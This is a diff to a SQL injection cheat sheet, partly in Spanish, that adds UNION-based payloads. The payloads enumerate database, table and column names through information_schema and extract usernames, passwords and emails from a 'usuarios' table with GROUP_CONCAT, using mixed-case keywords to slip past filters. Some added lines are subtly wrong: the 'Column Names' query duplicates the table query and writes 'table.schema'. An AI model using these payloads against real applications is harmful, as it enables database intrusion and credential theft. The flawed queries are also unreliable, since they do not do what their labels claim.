@@ -30,7 +30,7 @@ Es importante tener en cuenta que la disponibilidad y el contenido exacto de la 
 
 <br>
 
-## 💀 Basics: `information schema`
+## 💀 Basics: `information schema` & `data`
 
 ### 💉 SQL Query: Basic schema info
 
@@ -56,6 +56,8 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' a
 
 ### 💉 Web Injection: Extract `Database Names`, `Tables of a Database`, `Column Names`
 
+#### Group Concat
+
 ````py
 ## Database Names
 -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata 
@@ -67,8 +69,35 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' a
 -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[$table name],4,5,6
 ````
 
+#### Normal
+
+````py
+## Database Names
+-1' UniOn Select 1,2,3,schema_name FROM information_schema.schemata LIMIT 0,1 ,4,5,6
+
+## Tables of a Database
+-1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table.schema = [$database] LIMIT 0,1 ,4,5,6
+
+## Column Names
+-1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table.schema = [$database] LIMIT 0,1 ,4,5,6
+
+
+````
+
 ---
 
+### Data
+
+
+
+````sql
+SELECT GROUP_CONCAT(username,password,mail,' ::: ') FROM usuarios;
+````
+
+
+````py
+(SELECT+GROUP_CONCAT(username,0x3a,password,0x3a,mail+SEPARATOR+0x3c62723e)+FROM+usuarios)
+````
 ### 💉 Group Concat
 
 #### Basic
